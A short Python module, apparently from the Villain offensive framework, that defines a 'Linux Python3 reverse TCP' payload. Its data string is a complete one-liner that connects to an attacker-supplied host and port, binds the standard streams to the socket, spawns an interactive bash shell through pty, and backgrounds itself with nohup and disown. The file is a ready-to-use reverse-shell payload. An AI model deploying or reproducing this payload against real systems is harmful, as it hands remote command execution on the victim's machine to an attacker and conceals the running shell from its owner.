# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Linux Python3 reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Python3 reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'python3-reverse-tcp',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"*LHOST*\",*LPORT*));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"